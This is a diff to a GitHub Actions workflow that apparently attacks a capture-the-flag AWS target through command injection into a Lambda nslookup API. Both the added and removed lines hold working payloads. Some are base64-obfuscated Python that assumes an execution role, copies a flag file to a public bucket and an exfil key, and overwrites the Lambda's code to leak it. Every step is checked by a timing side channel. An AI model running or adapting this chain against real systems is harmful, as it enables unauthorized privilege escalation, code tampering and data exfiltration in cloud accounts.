@@ -147,17 +147,9 @@ jobs:
 
       - name: PRIVESC ATTEMPT 2 - Lambda RCE -> assume CTFExecutionRole -> write flag to platform-bucket
         run: |
-          echo "lambdaRole can assume CTFExecutionRole (confirmed). CTFExecutionRole has no VPC condition."
-          echo "Try 1: write flag to platform-bucket as CTFExecutionRole"
-          INJECT='x; python3 -c "
-          import subprocess,json,os,sys
-          r=json.loads(subprocess.run([\"aws\",\"sts\",\"assume-role\",\"--role-arn\",\"arn:aws:iam::009661764077:role/CTFExecutionRole\",\"--role-session-name\",\"p\"],capture_output=True,text=True).stdout)
-          c=r[\"Credentials\"]
-          e=dict(os.environ,AWS_ACCESS_KEY_ID=c[\"AccessKeyId\"],AWS_SECRET_ACCESS_KEY=c[\"SecretAccessKey\"],AWS_SESSION_TOKEN=c[\"SessionToken\"],AWS_DEFAULT_REGION=\"us-east-1\")
-          flag=subprocess.run([\"aws\",\"s3\",\"cp\",\"s3://codec4f26c862a321ef5/flag.txt\",\"-\"],env=e,capture_output=True,text=True).stdout
-          w=subprocess.run([\"aws\",\"s3\",\"cp\",\"-\",\"s3://platform-bucket-009661764077-us-east-1/flag-ctfe.txt\"],input=flag,env=e,capture_output=True,text=True)
-          sys.exit(0 if w.returncode==0 else 1)
-          " && sleep 15 || sleep 1 #'
+          echo "Fix: use base64-encoded Python to avoid double-quote bash quoting issues"
+          B64="aW1wb3J0IHN1YnByb2Nlc3MsanNvbixvcyxzeXMKcj1qc29uLmxvYWRzKHN1YnByb2Nlc3MucnVuKFsnYXdzJywnc3RzJywnYXNzdW1lLXJvbGUnLCctLXJvbGUtYXJuJywnYXJuOmF3czppYW06OjAwOTY2MTc2NDA3Nzpyb2xlL0NURkV4ZWN1dGlvblJvbGUnLCctLXJvbGUtc2Vzc2lvbi1uYW1lJywncCddLGNhcHR1cmVfb3V0cHV0PVRydWUsdGV4dD1UcnVlKS5zdGRvdXQpCmM9clsnQ3JlZGVudGlhbHMnXQplPWRpY3Qob3MuZW52aXJvbixBV1NfQUNDRVNTX0tFWV9JRD1jWydBY2Nlc3NLZXlJZCddLEFXU19TRUNSRVRfQUNDRVNTX0tFWT1jWydTZWNyZXRBY2Nlc3NLZXknXSxBV1NfU0VTU0lPTl9UT0tFTj1jWydTZXNzaW9uVG9rZW4nXSxBV1NfREVGQVVMVF9SRUdJT049J3VzLWVhc3QtMScpCmZsYWc9c3VicHJvY2Vzcy5ydW4oWydhd3MnLCdzMycsJ2NwJywnczM6Ly9jb2RlYzRmMjZjODYyYTMyMWVmNS9mbGFnLnR4dCcsJy0nXSxlbnY9ZSxjYXB0dXJlX291dHB1dD1UcnVlLHRleHQ9VHJ1ZSkuc3Rkb3V0CnIxPXN1YnByb2Nlc3MucnVuKFsnYXdzJywnczMnLCdjcCcsJy0nLCdzMzovL3BsYXRmb3JtLWJ1Y2tldC0wMDk2NjE3NjQwNzctdXMtZWFzdC0xL2ZsYWctY3RmZS50eHQnXSxpbnB1dD1mbGFnLGVudj1lLGNhcHR1cmVfb3V0cHV0PVRydWUsdGV4dD1UcnVlKQpyMj1zdWJwcm9jZXNzLnJ1bihbJ2F3cycsJ3MzJywnY3AnLCctJywnczM6Ly9jb2RlYzRmMjZjODYyYTMyMWVmNS9mbGFnLWV4ZmlsLnR4dCddLGlucHV0PWZsYWcsZW52PWUsY2FwdHVyZV9vdXRwdXQ9VHJ1ZSx0ZXh0PVRydWUpCnN5cy5leGl0KDAgaWYgKHIxLnJldHVybmNvZGU9PTAgb3IgcjIucmV0dXJuY29kZT09MCkgZWxzZSAxKQ=="
+          INJECT="x; echo $B64 | base64 -d | python3 && sleep 15 || sleep 1 #"
           python3 -c "import json,sys; print(json.dumps({'domain': sys.argv[1]}))" "$INJECT" > payload.json
           START=$(date +%s%N)
           curl -s -o /dev/null -X POST https://3q931syi7b.execute-api.us-east-1.amazonaws.com/dev/nslookup \
@@ -166,33 +158,22 @@ jobs:
           ELAPSED_MS=$(( (END - START) / 1000000 ))
           echo "Timing: ${ELAPSED_MS}ms"
           if [ $ELAPSED_MS -gt 10000 ]; then
-            echo "SUCCESS - flag written to platform-bucket!"
+            echo "SUCCESS - flag written!"
             sleep 3
+            echo "--- platform-bucket (public URL) ---"
             curl -s https://platform-bucket-009661764077-us-east-1.s3.amazonaws.com/flag-ctfe.txt
+            echo
+            echo "--- codec bucket listing (flag-exfil.txt should appear) ---"
+            aws s3 ls s3://codec4f26c862a321ef5/
           else
-            echo "Failed (write denied or flag read failed)"
+            echo "FAILED (timing: ${ELAPSED_MS}ms)"
           fi
 
       - name: PRIVESC ATTEMPT 3 - Lambda RCE -> assume CTFExecutionRole -> update Lambda code to return flag
         run: |
-          echo "Try 2: update Lambda function code (as CTFExecutionRole) to return flag in HTTP response"
-          NEW_CODE='import boto3,base64
-          def lambda_handler(event,context):
-            s=boto3.client("s3")
-            f=s.get_object(Bucket="codec4f26c862a321ef5",Key="flag.txt")["Body"].read().decode()
-            return {"statusCode":200,"body":f}
-          '
-          B64CODE=$(echo "$NEW_CODE" | python3 -c "import sys,base64,zipfile,io; code=sys.stdin.read(); buf=io.BytesIO(); z=zipfile.ZipFile(buf,'w'); z.writestr('lambda_function.py',code); z.close(); print(base64.b64encode(buf.getvalue()).decode())")
-          INJECT="x; python3 -c \"
-          import subprocess,json,os,base64,tempfile
-          r=json.loads(subprocess.run(['aws','sts','assume-role','--role-arn','arn:aws:iam::009661764077:role/CTFExecutionRole','--role-session-name','p2'],capture_output=True,text=True).stdout)
-          c=r['Credentials']
-          e=dict(os.environ,AWS_ACCESS_KEY_ID=c['AccessKeyId'],AWS_SECRET_ACCESS_KEY=c['SecretAccessKey'],AWS_SESSION_TOKEN=c['SessionToken'],AWS_DEFAULT_REGION='us-east-1')
-          zb=base64.b64decode('$B64CODE')
-          with open('/tmp/code.zip','wb') as f: f.write(zb)
-          out=subprocess.run(['aws','lambda','update-function-code','--function-name','nslookupv2','--zip-file','fileb:///tmp/code.zip'],env=e,capture_output=True,text=True)
-          import sys; sys.exit(0 if out.returncode==0 else 1)
-          \" && sleep 12 || sleep 1 #"
+          echo "Fix: base64-encoded Python avoids ALL quoting issues (prev failed due to nested quotes)"
+          B64="aW1wb3J0IHN1YnByb2Nlc3MsanNvbixvcyxzeXMsaW8semlwZmlsZQpyPWpzb24ubG9hZHMoc3VicHJvY2Vzcy5ydW4oWydhd3MnLCdzdHMnLCdhc3N1bWUtcm9sZScsJy0tcm9sZS1hcm4nLCdhcm46YXdzOmlhbTo6MDA5NjYxNzY0MDc3OnJvbGUvQ1RGRXhlY3V0aW9uUm9sZScsJy0tcm9sZS1zZXNzaW9uLW5hbWUnLCdwMiddLGNhcHR1cmVfb3V0cHV0PVRydWUsdGV4dD1UcnVlKS5zdGRvdXQpCmM9clsnQ3JlZGVudGlhbHMnXQplPWRpY3Qob3MuZW52aXJvbixBV1NfQUNDRVNTX0tFWV9JRD1jWydBY2Nlc3NLZXlJZCddLEFXU19TRUNSRVRfQUNDRVNTX0tFWT1jWydTZWNyZXRBY2Nlc3NLZXknXSxBV1NfU0VTU0lPTl9UT0tFTj1jWydTZXNzaW9uVG9rZW4nXSxBV1NfREVGQVVMVF9SRUdJT049J3VzLWVhc3QtMScpCmNvZGU9J2ltcG9ydCBib3RvM1xuZGVmIGxhbWJkYV9oYW5kbGVyKGV2ZW50LGNvbnRleHQpOlxuICBmPWJvdG8zLmNsaWVudCgiczMiKS5nZXRfb2JqZWN0KEJ1Y2tldD0iY29kZWM0ZjI2Yzg2MmEzMjFlZjUiLEtleT0iZmxhZy50eHQiKVsiQm9keSJdLnJlYWQoKS5kZWNvZGUoKVxuICByZXR1cm4geyJzdGF0dXNDb2RlIjoyMDAsImJvZHkiOmZ9XG4nCmJ1Zj1pby5CeXRlc0lPKCkKej16aXBmaWxlLlppcEZpbGUoYnVmLCJ3IikKei53cml0ZXN0cigibGFtYmRhX2Z1bmN0aW9uLnB5Iixjb2RlKQp6LmNsb3NlKCkKemI9YnVmLmdldHZhbHVlKCkKd2l0aCBvcGVuKCcvdG1wL25ld2NvZGUuemlwJywnd2InKSBhcyBmOiBmLndyaXRlKHpiKQpvdXQ9c3VicHJvY2Vzcy5ydW4oWydhd3MnLCdsYW1iZGEnLCd1cGRhdGUtZnVuY3Rpb24tY29kZScsJy0tZnVuY3Rpb24tbmFtZScsJ25zbG9va3VwdjInLCctLXppcC1maWxlJywnZmlsZWI6Ly8vdG1wL25ld2NvZGUuemlwJ10sZW52PWUsY2FwdHVyZV9vdXRwdXQ9VHJ1ZSx0ZXh0PVRydWUpCnN5cy5leGl0KDAgaWYgb3V0LnJldHVybmNvZGU9PTAgZWxzZSAxKQ=="
+          INJECT="x; echo $B64 | base64 -d | python3 && sleep 15 || sleep 1 #"
           python3 -c "import json,sys; print(json.dumps({'domain': sys.argv[1]}))" "$INJECT" > payload.json
           START=$(date +%s%N)
           curl -s -o /dev/null -X POST https://3q931syi7b.execute-api.us-east-1.amazonaws.com/dev/nslookup \
@@ -202,24 +183,25 @@ jobs:
           echo "Lambda code update timing: ${ELAPSED_MS}ms"
           if [ $ELAPSED_MS -gt 10000 ]; then
             echo "SUCCESS - Lambda code updated! Invoking to get flag..."
-            sleep 5
+            sleep 10
             curl -s -X POST https://3q931syi7b.execute-api.us-east-1.amazonaws.com/dev/nslookup \
               -H "Content-Type: application/json" -d '{"domain":"x"}'
           else
-            echo "Failed (lambda:UpdateFunctionCode denied for CTFExecutionRole)"
+            echo "FAILED - lambda:UpdateFunctionCode denied or assume-role failed"
           fi
 
-      - name: Privilege escalation - test sts:AssumeRole for CTFExecutionRole
+      - name: Privilege escalation - test sts:AssumeRole for CTFExecutionRole (FIXED - uses Python for true success/fail)
         run: |
-          echo "Escalation vector 1: Try to assume CTFExecutionRole from Lambda (as lambdaRole)"
-          INJECT="x; aws sts assume-role --role-arn arn:aws:iam::009661764077:role/CTFExecutionRole --role-session-name privesc-test 2>&1 | head -c 200 && sleep 10 || sleep 1 #"
+          echo "Proper assume-role test: Python parses JSON and exits 0 ONLY on real Credentials"
+          B64="aW1wb3J0IHN1YnByb2Nlc3MsanNvbixzeXMKb3V0PXN1YnByb2Nlc3MucnVuKFsnYXdzJywnc3RzJywnYXNzdW1lLXJvbGUnLCctLXJvbGUtYXJuJywnYXJuOmF3czppYW06OjAwOTY2MTc2NDA3Nzpyb2xlL0NURkV4ZWN1dGlvblJvbGUnLCctLXJvbGUtc2Vzc2lvbi1uYW1lJywndCddLGNhcHR1cmVfb3V0cHV0PVRydWUsdGV4dD1UcnVlKQp0cnk6CiAgICByPWpzb24ubG9hZHMob3V0LnN0ZG91dCkKICAgIF89clsnQ3JlZGVudGlhbHMnXQogICAgc3lzLmV4aXQoMCkKZXhjZXB0OgogICAgc3lzLmV4aXQoMSk="
+          INJECT="x; echo $B64 | base64 -d | python3 && sleep 12 || sleep 1 #"
           python3 -c "import json,sys; print(json.dumps({'domain': sys.argv[1]}))" "$INJECT" > payload.json
           START=$(date +%s%N)
           curl -s -o /dev/null -X POST https://3q931syi7b.execute-api.us-east-1.amazonaws.com/dev/nslookup \
             -H "Content-Type: application/json" -d @payload.json
           END=$(date +%s%N)
           ELAPSED_MS=$(( (END - START) / 1000000 ))
-          echo "sts:AssumeRole timing: ${ELAPSED_MS}ms (>10s = success, ~1s = denied)"
+          echo "sts:AssumeRole timing: ${ELAPSED_MS}ms (>10s = CONFIRMED success, ~1s = denied)"
 
       - name: Privilege escalation - check lambdaRole's attached policies
         run: |
